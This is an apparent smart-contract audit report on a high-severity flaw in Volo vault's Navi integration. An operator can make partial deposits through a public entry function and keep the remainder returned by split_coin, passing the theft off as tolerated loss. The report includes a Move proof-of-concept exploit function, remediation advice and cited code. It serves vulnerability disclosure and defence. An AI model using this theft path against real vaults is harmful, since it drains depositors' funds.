# Audit Report

## Title
Vault Operators Can Steal Funds via split_coin_to_balance() Remainder Transfer in Navi Integration

## Summary
Vault operators can exploit Navi's `entry_deposit_on_behalf_of_user()` function to systematically drain vault funds up to the `loss_tolerance` limit per epoch. The vulnerability stems from the `split_coin()` function transferring coin remainders back to the transaction sender, allowing operators to deposit partial amounts to the vault's Navi position while pocketing the remainder.

## Finding Description

The vulnerability exists due to a dangerous interaction between Volo vault's operation flow and Navi protocol's entry functions:

**Root Cause:** The `split_coin()` function unconditionally transfers any remainder back to the caller. [1](#0-0) 

This function is called by `split_coin_to_balance()` [2](#0-1) , which is used by Navi's `deposit_on_behalf_of_user()` friend function [3](#0-2) .

**Attack Vector:** The critical exposure is through `entry_deposit_on_behalf_of_user()` - a **public entry function** that anyone can call. [4](#0-3) 

**Attack Flow:**
1. Operator initiates a vault operation and borrows principal balance (e.g., 100 SUI) [5](#0-4) 
2. Operator converts Balance to Coin via standard Sui operations
3. Operator calls `entry_deposit_on_behalf_of_user(coin_worth_100, amount=60, user=vault_navi_account_address)`
4. The function deposits 60 to vault's Navi position but transfers 40 back to operator
5. Operator returns empty/partial balance to vault [6](#0-5) 
6. Loss tolerance check validates the loss [7](#0-6) 

**Why Existing Protections Fail:**
- The vault's `return_free_principal()` accepts any balance amount without validating it matches what was borrowed
- Loss tolerance check enforces the loss is within limits but **allows** losses up to the configured threshold [8](#0-7) 
- While safe wrapper functions like `deposit_with_account_cap()` exist [9](#0-8) , nothing prevents operators from calling the unsafe entry function directly

**Security Invariant Broken:**
Operators should not be able to profit personally from managing vault funds. Loss tolerance is designed to accommodate legitimate DeFi strategy losses, not systematic theft by trusted operators.

## Impact Explanation

**Direct Fund Theft:** This allows systematic, repeatable extraction of vault funds constrained only by `loss_tolerance` (which can be up to 100% based on RATE_SCALING). [10](#0-9) 

**Quantified Impact:**
- Per-epoch theft: `vault_usd_value * (loss_tolerance / 10000)`
- For a $1M vault with typical loss_tolerance, operators can extract significant amounts per epoch
- Attack can be repeated every epoch
- Multiple operators can compound the damage

**Affected Parties:**
- All vault depositors lose proportional value
- Protocol reputation severely damaged
- Affects any Volo vault with Navi integration

**Severity: HIGH** because:
1. Direct, measurable fund theft
2. Requires only OperatorCap (not admin privileges)
3. No special preconditions beyond normal operations
4. Theft appears as legitimate losses within tolerance
5. Systematic and repeatable

## Likelihood Explanation

**Highly Feasible:**
- Entry point is publicly accessible [11](#0-10) 
- Requires only OperatorCap which operators legitimately hold
- Attack executes in a single programmable transaction block
- All necessary objects (Storage, Pool, IncentiveV2, IncentiveV3) are shared objects
- No complex timing or oracle manipulation required

**Economic Rationality:**
- Near-zero cost (gas only)
- Direct profit = stolen amount
- Low detection risk as losses appear legitimate
- Can be executed repeatedly

**Detection Difficulty:** The attack manifests as a partial deposit to the vault's Navi account with "unfortunate losses," making it difficult to distinguish from actual DeFi strategy losses without detailed forensic analysis.

## Recommendation

**Solution 1: Remove amount parameter from on-behalf functions**
Modify Navi integration to always deposit the full coin amount, not partial amounts. Use `coin::into_balance()` directly instead of `split_coin_to_balance()`.

**Solution 2: Add vault-specific wrappers**
Volo should implement its own wrapper functions for Navi operations that operators must use, which:
- Take Balance directly (not Coin)
- Do not expose the `amount` parameter
- Ensure all borrowed funds are either returned or properly accounted

**Solution 3: Enhanced post-operation validation**
Track exact amounts borrowed and require exact return or documented allocation to DeFi positions, not relying solely on loss tolerance.

## Proof of Concept

A malicious operator could execute this attack as follows:

```move
// In a programmable transaction block:
public entry fun exploit_vault<T>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    navi_storage: &mut Storage,
    navi_pool: &mut Pool<T>,
    incentive_v2: &mut IncentiveV2,
    incentive_v3: &mut IncentiveV3,
    clock: &Clock,
    ctx: &mut TxContext
) {
    // 1. Start operation and borrow 100 units
    let (bag, tx_bag, tx_check, principal_balance, coin_balance) = 
        start_op_with_bag(vault, operation, cap, clock, vector[], vector[], 100, 0, ctx);
    
    // 2. Convert Balance to Coin
    let coin = principal_balance.into_coin(ctx);
    
    // 3. Call entry_deposit_on_behalf_of_user with partial amount
    // This deposits only 60 units to vault's Navi account
    // and transfers 40 units back to operator (tx_context::sender)
    entry_deposit_on_behalf_of_user<T>(
        clock,
        navi_storage,
        navi_pool,
        0, // asset id
        coin,
        60, // amount < coin value
        vault_navi_account_address, // vault's Navi account
        incentive_v2,
        incentive_v3,
        ctx
    );
    
    // 4. Return empty balance to vault
    end_op_with_bag(vault, operation, cap, bag, tx_bag, balance::zero(), coin_balance);
    
    // 5. Complete operation - loss check passes if within tolerance
    end_op_value_update_with_bag(vault, operation, cap, clock, tx_check);
    
    // Operator now has 40 units in their wallet
    // Vault lost net 40 units (100 borrowed - 60 deposited to Navi)
}
```

## Notes

**Important Clarification:** The claim mentions both `entry_deposit_on_behalf_of_user()` and `entry_repay_on_behalf_of_user()`. However, only `entry_deposit_on_behalf_of_user()` is actually a public entry function. The `entry_repay_on_behalf_of_user()` function is declared as `public fun` (not `public entry fun`), so it cannot be called directly in transactions. [12](#0-11) 

Nevertheless, the vulnerability is valid through the deposit attack vector alone, which is sufficient to constitute a HIGH severity issue.

The root cause is that Volo vault operations allow operators to convert borrowed Balance to Coin and call arbitrary public entry functions, which was not intended. The protocol should either restrict which functions operators can call with vault funds or ensure all Navi interactions go through safe wrapper functions that don't expose partial deposit/repay capabilities.

### Citations

**File:** volo-vault/local_dependencies/protocol/utils/sources/utils.move (L24-24)
```text
        transfer::public_transfer(split_coin, tx_context::sender(ctx));
```

**File:** volo-vault/local_dependencies/protocol/utils/sources/utils.move (L28-35)
```text
    public fun split_coin_to_balance<CoinType>(split_coin: Coin<CoinType>, amount: u64, ctx: &mut TxContext): Balance<CoinType> {
        // Split coin
        let split = split_coin(split_coin, amount, ctx);

        // put in balance
        let balance = coin::into_balance(split);
        balance
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/lending.move (L483-492)
```text
    public(friend) fun deposit_with_account_cap<CoinType>(
        clock: &Clock,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        deposit_coin: Coin<CoinType>,
        account_cap: &AccountCap
    ) {
        base_deposit(clock, storage, pool, asset, account::account_owner(account_cap), coin::into_balance(deposit_coin))
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/lending.move (L555-565)
```text
    public(friend) fun deposit_on_behalf_of_user<CoinType>(clock: &Clock, storage: &mut Storage, pool: &mut Pool<CoinType>, asset: u8, user: address, deposit_coin: Coin<CoinType>, value: u64, ctx: &mut TxContext) {
        let deposit_balance = utils::split_coin_to_balance(deposit_coin, value, ctx);
        base_deposit(clock, storage, pool, asset, user, deposit_balance);

        emit(DepositOnBehalfOfEvent{
            reserve: asset,
            sender: tx_context::sender(ctx),
            user: user,
            amount: value,
        })
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/incentive_v3.move (L815-831)
```text
    public entry fun entry_deposit_on_behalf_of_user<CoinType>(
        clock: &Clock,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        deposit_coin: Coin<CoinType>,
        amount: u64,
        user: address,
        incentive_v2: &mut IncentiveV2,
        incentive_v3: &mut Incentive,
        ctx: &mut TxContext
    ) {
        incentive_v2::update_reward_all(clock, incentive_v2, storage, asset, user);
        update_reward_state_by_asset<CoinType>(clock, incentive_v3, storage, user);

        lending::deposit_on_behalf_of_user<CoinType>(clock, storage, pool, asset, user, deposit_coin, amount, ctx);
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/incentive_v3.move (L1016-1016)
```text
    public fun entry_repay_on_behalf_of_user<CoinType>(
```

**File:** volo-vault/sources/operation.move (L94-207)
```text
public fun start_op_with_bag<T, CoinType, ObligationType>(
    vault: &mut Vault<T>,
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    defi_asset_ids: vector<u8>,
    defi_asset_types: vector<TypeName>,
    principal_amount: u64,
    coin_type_asset_amount: u64,
    ctx: &mut TxContext,
): (Bag, TxBag, TxBagForCheckValueUpdate, Balance<T>, Balance<CoinType>) {
    vault::assert_operator_not_freezed(operation, cap);
    pre_vault_check(vault, ctx);

    let mut defi_assets = bag::new(ctx);

    let defi_assets_length = defi_asset_ids.length();
    assert!(defi_assets_length == defi_asset_types.length(), ERR_ASSETS_LENGTH_MISMATCH);

    let mut i = 0;
    while (i < defi_assets_length) {
        let defi_asset_id = defi_asset_ids[i];
        let defi_asset_type = defi_asset_types[i];

        if (defi_asset_type == type_name::get<NaviAccountCap>()) {
            let navi_asset_type = vault_utils::parse_key<NaviAccountCap>(defi_asset_id);
            let navi_account_cap = vault.borrow_defi_asset<T, NaviAccountCap>(
                vault_utils::parse_key<NaviAccountCap>(defi_asset_id),
            );
            defi_assets.add<String, NaviAccountCap>(navi_asset_type, navi_account_cap);
        };

        if (defi_asset_type == type_name::get<CetusPosition>()) {
            let cetus_asset_type = vault_utils::parse_key<CetusPosition>(defi_asset_id);
            let cetus_position = vault.borrow_defi_asset<T, CetusPosition>(cetus_asset_type);
            defi_assets.add<String, CetusPosition>(cetus_asset_type, cetus_position);
        };

        if (defi_asset_type == type_name::get<SuilendObligationOwnerCap<ObligationType>>()) {
            let obligation_asset_type = vault_utils::parse_key<
                SuilendObligationOwnerCap<ObligationType>,
            >(
                defi_asset_id,
            );
            let obligation = vault.borrow_defi_asset<T, SuilendObligationOwnerCap<ObligationType>>(
                obligation_asset_type,
            );
            defi_assets.add<String, SuilendObligationOwnerCap<ObligationType>>(
                obligation_asset_type,
                obligation,
            );
        };

        if (defi_asset_type == type_name::get<MomentumPosition>()) {
            let momentum_asset_type = vault_utils::parse_key<MomentumPosition>(defi_asset_id);
            let momentum_position = vault.borrow_defi_asset<T, MomentumPosition>(
                momentum_asset_type,
            );
            defi_assets.add<String, MomentumPosition>(momentum_asset_type, momentum_position);
        };

        if (defi_asset_type == type_name::get<Receipt>()) {
            let receipt_asset_type = vault_utils::parse_key<Receipt>(defi_asset_id);
            let receipt = vault.borrow_defi_asset<T, Receipt>(receipt_asset_type);
            defi_assets.add<String, Receipt>(receipt_asset_type, receipt);
        };

        i = i + 1;
    };

    let principal_balance = if (principal_amount > 0) {
        vault.borrow_free_principal(principal_amount)
    } else {
        balance::zero<T>()
    };

    let coin_type_asset_balance = if (coin_type_asset_amount > 0) {
        vault.borrow_coin_type_asset<T, CoinType>(
            coin_type_asset_amount,
        )
    } else {
        balance::zero<CoinType>()
    };

    let total_usd_value = vault.get_total_usd_value(clock);
    let total_shares = vault.total_shares();

    let tx = TxBag {
        vault_id: vault.vault_id(),
        defi_asset_ids,
        defi_asset_types,
    };

    let tx_for_check_value_update = TxBagForCheckValueUpdate {
        vault_id: vault.vault_id(),
        defi_asset_ids,
        defi_asset_types,
        total_usd_value,
        total_shares,
    };

    emit(OperationStarted {
        vault_id: vault.vault_id(),
        defi_asset_ids,
        defi_asset_types,
        principal_coin_type: type_name::get<T>(),
        principal_amount,
        coin_type_asset_type: type_name::get<CoinType>(),
        coin_type_asset_amount,
        total_usd_value,
    });

    (defi_assets, tx, tx_for_check_value_update, principal_balance, coin_type_asset_balance)
}
```

**File:** volo-vault/sources/operation.move (L286-286)
```text
    vault.return_free_principal(principal_balance);
```

**File:** volo-vault/sources/operation.move (L359-364)
```text
    // Update tolerance if there is a loss (there is a max loss limit each epoch)
    let mut loss = 0;
    if (total_usd_value_after < total_usd_value_before) {
        loss = total_usd_value_before - total_usd_value_after;
        vault.update_tolerance(loss);
    };
```

**File:** volo-vault/sources/volo_vault.move (L28-28)
```text
const RATE_SCALING: u64 = 10_000;
```

**File:** volo-vault/sources/volo_vault.move (L626-641)
```text
public(package) fun update_tolerance<T0>(self: &mut Vault<T0>, loss: u256) {
    self.check_version();

    self.cur_epoch_loss = self.cur_epoch_loss + loss;

    // let loss_limit = usd_value_before * (self.loss_tolerance as u256) / (RATE_SCALING as u256);
    let loss_limit =
        self.cur_epoch_loss_base_usd_value * (self.loss_tolerance as u256) / (RATE_SCALING as u256);

    assert!(loss_limit >= self.cur_epoch_loss, ERR_EXCEED_LOSS_LIMIT);
    emit(LossToleranceUpdated {
        vault_id: self.vault_id(),
        current_loss: self.cur_epoch_loss,
        loss_limit: loss_limit,
    });
}
```
